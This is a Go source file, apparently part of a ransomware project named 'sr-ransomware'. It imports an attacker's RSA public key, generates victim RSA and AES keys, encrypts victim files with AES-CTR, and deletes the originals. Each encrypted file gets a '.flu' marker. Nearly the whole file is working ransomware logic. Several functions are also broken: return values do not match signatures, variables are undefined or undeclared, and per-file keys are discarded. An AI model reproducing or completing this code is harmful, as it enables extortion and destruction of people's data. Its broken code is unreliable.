package scheme

import (
    "os"
    "io"
    "io/ioutil"
    "encoding/binary"
    "path/filepath"
    "crypto/cipher"
    "crypto/rand"
    "crypto/rsa"
    "crypto/aes"

    "github.com/sug0/sr-ransomware/go/fs"
    "github.com/sug0/sr-ransomware/go/errors"
    "github.com/sug0/sr-ransomware/go/crypto/util"
)

func ImportPublicKey() (*rsa.PublicKey, error) {
    pkData, err := ioutil.ReadFile(filepath.Join(workDir, attackerPublicKey))
    if err != nil {
        return nil, errors.Wrap(pkg, "failed to read RSA public key", err)
    }
    pk, err := util.ImportPEMPublicKeyRSA(pkData)
    return pk, errors.WrapIfNotNil(pkg, "failed to import RSA public key", err)
}

func EncryptFile(pk *rsa.PublicKey, path string) error {
    // aes key stuff
    aesKey, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES key", err)
    }
    aesIV, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES IV", err)
    }
    aesBlock, _ := aes.NewCipher(aesKey)
    aesStream := cipher.NewCTR(aesBlock, aesIV)

    err = writeEncrypted(pk, path, aesStream)
    if err != nil {
        return err
    }

    // remove original file
    return errors.WrapIfNotNil(pkg, "failed to remove file", os.Remove(path))
}

func writeEncrypted(pk *rsa.PublicKey, path string, aesStream cipher.Stream) error {
    n, err := encryptFile(pk, path, aesStream)

    path = filepath.Base(path)
    newPath := path + ".flu"
    oldPath := path + ".flu.sniffle"

    fEncrypted, err := os.Create(file)
    if err != nil {
        return 0, errors.Wrap(pkg, "failed to create file", err)
    }
    defer fEncrypted.Close()

    err = io.WriteString(fEncrypted, "JUSTA FLU BRO :)")
    if err != nil {
        return errors.Wrap(pkg, "failed to write magic", err)
    }
}

func encryptFile(pk *rsa.PublicKey, path string, aesStream cipher.Stream) (int64, error) {
    path = filepath.Base(path)
    newPath := path + ".flu.sniffle"

    err := fs.Move(newPath, path)
    if err != nil {
        return 0, errors.Wrap(pkg, "failed to move victim file", err)
    }

    fOriginal, err := os.Open(path)
    if err != nil {
        return 0, errors.Wrap(pkg, "failed to open file", err)
    }
    defer fOriginal.Close()

    fEncrypted, err := os.Create(newPath)
    if err != nil {
        return 0, errors.Wrap(pkg, "failed to create file", err)
    }
    defer fEncrypted.Close()

    stream := cipher.StreamWriter{S: aesStream, W: fEncrypted}
    n, err := io.Copy(stream, fOriginal)

    if err != nil {
        return 0, errors.Wrap(pkg, "failed to encrypte file with AES", err)
    }
    return n, nil
}

func GenerateKeys() error {
    // global rsa key
    pk, err := ImportPublicKey()
    if err != nil {
        return err
    }

    // local rsa keys
    sk, err := util.GenerateKeyRSA(2048)
    if err != nil {
        return errors.Wrap(pkg, "failed to generate RSA secret key", err)
    }
    pkData, err = util.ExportDERPublicKeyRSA(&sk.PublicKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to marshal RSA public key", err)
    }
    err = ioutil.WriteFile(filepath.Join(workDir, victimPublicKey), pkData, 0644)
    if err != nil {
        return errors.Wrap(pkg, "failed to write RSA public key", err)
    }

    // aes key stuff
    aesKey, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES key", err)
    }
    aesIV, err := util.GenerateAES()
    if err != nil {
        return errors.Wrap(pkg, "failed to generate AES IV", err)
    }
    aesBlock, _ := aes.NewCipher(aesKey)
    aesCiph := cipher.NewCTR(aesBlock, aesIV)

    // export rsa pub encrypted with aes
    skData, err := util.ExportDERSecretKeyRSA(sk)
    if err != nil {
        return errors.Wrap(pkg, "failed to marshal RSA secret key", err)
    }
    skData = util.Pad(skData, aes.BlockSize)
    aesCiph.XORKeyStream(skData, skData)
    err = ioutil.WriteFile(filepath.Join(workDir, victimSecretKey), skData, 0644)
    if err != nil {
        return errors.Wrap(pkg, "failed to write RSA secret key", err)
    }

    // export aes key encrypted with rsa pub
    ivKey := append(aesIV, aesKey...)
    aesEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, pk, ivKey)
    if err != nil {
        return errors.Wrap(pkg, "failed to encrypt AES key", err)
    }
    err = ioutil.WriteFile(filepath.Join(workDir, victimAESKey), aesEncrypted, 0644)
    if err != nil {
        return errors.Wrap(pkg, "failed to write AES key", err)
    }

    return nil
}
